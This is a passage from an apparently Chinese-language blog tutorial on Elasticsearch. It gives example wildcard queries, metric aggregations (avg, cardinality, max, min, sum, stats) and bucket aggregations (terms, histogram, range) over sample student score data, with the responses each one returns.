class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;wildcard&quot;: &#123;</span><br><span class="line">      &quot;address&quot;: &#123;</span><br><span class="line">        &quot;value&quot;: &quot;bei*g&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 结果返回china beijing</span><br></pre></td></tr></table></figure><h3 id="聚合（aggregation）"><a href="#聚合（aggregation）" class="headerlink" title="聚合（aggregation）"></a>聚合（aggregation）</h3><p>ES中的聚合查询，类似SQL的SUM/AVG/COUNT/GROUP BY分组查询，主要用于统计分析场景。</p><p>ES聚合查询类似SQL的GROUP by，一般统计分析主要分为两个步骤：</p><ul><li>  分组</li><li>  组内聚合</li></ul><p>对查询的数据首先进行一轮分组，可以设置分组条件，例如：新生入学，把所有的学生按专业分班，这个分班的过程就是对学生进行了分组。</p><p>组内聚合，就是对组内的数据进行统计，例如：计算总数、求平均值等等，接上面的例子，学生都按专业分班了，那么就可以统计每个班的学生总数， 这个统计每个班学生总数的计算，就是组内聚合计算。</p><h4 id="指标聚合（Metric）"><a href="#指标聚合（Metric）" class="headerlink" title="指标聚合（Metric）"></a>指标聚合（<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations-metrics.html">Metric</a>）</h4><p>ES指标聚合，可以对document进行聚合，也可以对聚合后的结果进行聚合。通常对文档中的一个字段进行聚合，但也可以使用脚本。</p><p>常用的聚合函数如下。</p><p>准备数据</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST student/_bulk</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;Jack&quot;, &quot;score&quot;: 99, &quot;subject&quot;: &quot;english&quot;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;Jack&quot;, &quot;score&quot;: 78, &quot;subject&quot;: &quot;chinese&quot;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;Jack&quot;, &quot;score&quot;: 80, &quot;subject&quot;: &quot;math&quot;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;Bob&quot;, &quot;score&quot;: 87, &quot;subject&quot;: &quot;english&quot;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;Bob&quot;, &quot;score&quot;: 91, &quot;subject&quot;: &quot;chinese&quot;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;Bob&quot;, &quot;score&quot;: 69, &quot;subject&quot;: &quot;math&quot;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;Alice&quot;, &quot;score&quot;: 77, &quot;subject&quot;: &quot;english&quot;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;Alice&quot;, &quot;score&quot;: 47, &quot;subject&quot;: &quot;chinese&quot;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;Alice&quot;, &quot;score&quot;: 100, &quot;subject&quot;: &quot;math&quot;&#125;</span><br></pre></td></tr></table></figure><h5 id="Avg"><a href="#Avg" class="headerlink" title="Avg"></a>Avg</h5><p>求每个学生的平均分。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0, # 不要返回文档内容</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;name_agg&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;name.keyword&quot; </span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;aggs&quot;: &#123;</span><br><span class="line">        &quot;score_agg&quot;: &#123;</span><br><span class="line">          &quot;avg&quot;: &#123;</span><br><span class="line">            &quot;field&quot;: &quot;score&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回内容如下</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&quot;aggregations&quot;: &#123;</span><br><span class="line">    &quot;name_agg&quot;: &#123;</span><br><span class="line">      &quot;doc_count_error_upper_bound&quot;: 0,</span><br><span class="line">      &quot;sum_other_doc_count&quot;: 0,</span><br><span class="line">      &quot;buckets&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;key&quot;: &quot;Alice&quot;,</span><br><span class="line">          &quot;doc_count&quot;: 3,</span><br><span class="line">          &quot;score_agg&quot;: &#123;</span><br><span class="line">            &quot;value&quot;: 74.66666666666667</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;key&quot;: &quot;Bob&quot;,</span><br><span class="line">          &quot;doc_count&quot;: 3,</span><br><span class="line">          &quot;score_agg&quot;: &#123;</span><br><span class="line">            &quot;value&quot;: 82.33333333333333</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;key&quot;: &quot;Jack&quot;,</span><br><span class="line">          &quot;doc_count&quot;: 3,</span><br><span class="line">          &quot;score_agg&quot;: &#123;</span><br><span class="line">            &quot;value&quot;: 85.66666666666667</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>也可以使用脚本</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /student/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0, </span><br><span class="line">  &quot;runtime_mappings&quot;: &#123;</span><br><span class="line">    &quot;grade.corrected&quot;: &#123;</span><br><span class="line">      &quot;type&quot;: &quot;double&quot;,</span><br><span class="line">      &quot;script&quot;: &#123;</span><br><span class="line">        &quot;source&quot;: &quot;emit(Math.min(100, doc[&#x27;score&#x27;].value * params.correction))&quot;, # 分数乘以1.2 和 100 取最小值</span><br><span class="line">        &quot;params&quot;: &#123;</span><br><span class="line">          &quot;correction&quot;: 1.2</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;name_agg&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;name.keyword&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;aggs&quot;: &#123;</span><br><span class="line">        &quot;score_agg&quot;: &#123;</span><br><span class="line">          &quot;avg&quot;: &#123;</span><br><span class="line">            &quot;field&quot;: &quot;grade.corrected&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="cardinality"><a href="#cardinality" class="headerlink" title="cardinality"></a>cardinality</h5><p>计算总数，会对count结果去重，类似与sql里面的count(distinct )，另外<code>Value Count</code>不会去重</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /student/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;type_count&quot;: &#123;</span><br><span class="line">      &quot;cardinality&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;score&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;aggregations&quot;: &#123;</span><br><span class="line">  &quot;type_count&quot;: &#123;</span><br><span class="line">    &quot;value&quot;: 9</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="max"><a href="#max" class="headerlink" title="max"></a>max</h5><p>求取每个学生的最大分</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;name_agg&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;name.keyword&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;aggs&quot;: &#123;</span><br><span class="line">        &quot;score_agg&quot;: &#123;</span><br><span class="line">          &quot;max&quot;: &#123;</span><br><span class="line">            &quot;field&quot;: &quot;score&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="min"><a href="#min" class="headerlink" title="min"></a>min</h5><p>求取每个学生的最小分</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;name_agg&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;name.keyword&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;aggs&quot;: &#123;</span><br><span class="line">        &quot;score_agg&quot;: &#123;</span><br><span class="line">          &quot;min&quot;: &#123;</span><br><span class="line">            &quot;field&quot;: &quot;score&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="sum"><a href="#sum" class="headerlink" title="sum"></a>sum</h5><p>求取每个学生的分数总和</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;name_agg&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;name.keyword&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;aggs&quot;: &#123;</span><br><span class="line">        &quot;score_agg&quot;: &#123;</span><br><span class="line">          &quot;sum&quot;: &#123;</span><br><span class="line">            &quot;field&quot;: &quot;score&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="stats"><a href="#stats" class="headerlink" title="stats"></a>stats</h5><p>求取每个学生的各项指标，包括count、sum、min、max、avg。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;name_agg&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;name.keyword&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;aggs&quot;: &#123;</span><br><span class="line">        &quot;score_agg&quot;: &#123;</span><br><span class="line">          &quot;stats&quot;: &#123;</span><br><span class="line">            &quot;field&quot;: &quot;score&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回结果</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&quot;aggregations&quot;: &#123;</span><br><span class="line">  &quot;name_agg&quot;: &#123;</span><br><span class="line">    &quot;doc_count_error_upper_bound&quot;: 0,</span><br><span class="line">    &quot;sum_other_doc_count&quot;: 0,</span><br><span class="line">    &quot;buckets&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: &quot;Alice&quot;,</span><br><span class="line">        &quot;doc_count&quot;: 3,</span><br><span class="line">        &quot;score_agg&quot;: &#123;</span><br><span class="line">          &quot;count&quot;: 3,</span><br><span class="line">          &quot;min&quot;: 47,</span><br><span class="line">          &quot;max&quot;: 100,</span><br><span class="line">          &quot;avg&quot;: 74.66666666666667,</span><br><span class="line">          &quot;sum&quot;: 224</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: &quot;Bob&quot;,</span><br><span class="line">        &quot;doc_count&quot;: 3,</span><br><span class="line">        &quot;score_agg&quot;: &#123;</span><br><span class="line">          &quot;count&quot;: 3,</span><br><span class="line">          &quot;min&quot;: 69,</span><br><span class="line">          &quot;max&quot;: 91,</span><br><span class="line">          &quot;avg&quot;: 82.33333333333333,</span><br><span class="line">          &quot;sum&quot;: 247</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: &quot;Jack&quot;,</span><br><span class="line">        &quot;doc_count&quot;: 3,</span><br><span class="line">        &quot;score_agg&quot;: &#123;</span><br><span class="line">          &quot;count&quot;: 3,</span><br><span class="line">          &quot;min&quot;: 78,</span><br><span class="line">          &quot;max&quot;: 99,</span><br><span class="line">          &quot;avg&quot;: 85.66666666666667,</span><br><span class="line">          &quot;sum&quot;: 257</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="桶聚合（Bucket）"><a href="#桶聚合（Bucket）" class="headerlink" title="桶聚合（Bucket）"></a>桶聚合（Bucket）</h4><p>ES桶聚合目的就是数据分组，先将数据按指定的条件分成多个组，然后对每一个组进行统计。</p><ul><li>  <strong>Terms聚合</strong> - 类似SQL的group by，根据字段唯一值分组</li><li>  <strong>Histogram聚合</strong> - 根据数值间隔分组，例如: 价格按100间隔分组，0、100、200、300等等</li><li>  <strong>Date histogram聚合</strong> - 根据时间间隔分组，例如：按月、按天、按小时分组</li><li>  <strong>Range聚合</strong> - 按数值范围分组，例如: 0-150一组，150-200一组，200-500一组。</li></ul><h5 id="Terms"><a href="#Terms" class="headerlink" title="Terms"></a>Terms</h5><p>统计每个学生有多少条科目成绩记录，类似与select name, count(*) from student group by name。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;terms_bucket&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;name.keyword&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回结果</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&quot;aggregations&quot;: &#123;</span><br><span class="line">  &quot;terms_bucket&quot;: &#123;</span><br><span class="line">    &quot;doc_count_error_upper_bound&quot;: 0,</span><br><span class="line">    &quot;sum_other_doc_count&quot;: 0,</span><br><span class="line">    &quot;buckets&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: &quot;Alice&quot;,</span><br><span class="line">        &quot;doc_count&quot;: 3</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: &quot;Bob&quot;,</span><br><span class="line">        &quot;doc_count&quot;: 3</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: &quot;Jack&quot;,</span><br><span class="line">        &quot;doc_count&quot;: 3</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="histogram"><a href="#histogram" class="headerlink" title="histogram"></a>histogram</h5><p>计算成绩在每个分段的情况。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;histogram_bucket&quot;: &#123;</span><br><span class="line">      &quot;histogram&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;score&quot;, # 以分数作为聚合条件</span><br><span class="line">        &quot;interval&quot;: 10, # 间隔为10</span><br><span class="line">        &quot;min_doc_count&quot;: 1 # 区间最少有一个文档</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&quot;aggregations&quot;: &#123;</span><br><span class="line">  &quot;histogram_bucket&quot;: &#123;</span><br><span class="line">    &quot;buckets&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: 40,</span><br><span class="line">        &quot;doc_count&quot;: 1</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: 60,</span><br><span class="line">        &quot;doc_count&quot;: 1</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: 70,</span><br><span class="line">        &quot;doc_count&quot;: 2</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: 80,</span><br><span class="line">        &quot;doc_count&quot;: 2</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: 90,</span><br><span class="line">        &quot;doc_count&quot;: 2</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: 100,</span><br><span class="line">        &quot;doc_count&quot;: 1</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="range-1"><a href="#range-1" class="headerlink" title="range"></a>range</h5><p>自定义桶分桶条件，列入0-59、60-79、80-100三个部分来进行聚合统计。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;range_bucket&quot;: &#123;</span><br><span class="line">      &quot;range&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;score&quot;,</span><br><span class="line">        &quot;ranges&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;to&quot;: 59</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;from&quot;: 60,</span><br><span class="line">            &quot;to&quot;: 79</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;from&quot;: 80</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&quot;aggregations&quot;: &#123;</span><br><span class="line">  &quot;range_bucket&quot;: &#123;</span><br><span class="line">    &quot;buckets&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: &quot;*-59.0&quot;,</span><br><span class="line">        &quot;to&quot;: 59,</span><br><span class="line">        &quot;doc_count&quot;: 1</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: &quot;60.0-79.0&quot;,</span><br><span class="line">        &quot;from&quot;: 60,</span><br><span class="line">        &quot;to&quot;: 79,</span><br><span class="line">        &quot;doc_count&quot;: 3</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;key&quot;: &quot;80.0-*&quot;,</span><br><span class="line">        &quot;from&quot;: 80,</span><br><span class="line">        &quot;doc_count&quot;: 5</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h5><p>统计每个学生的分值 并 按照从大到小排序</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 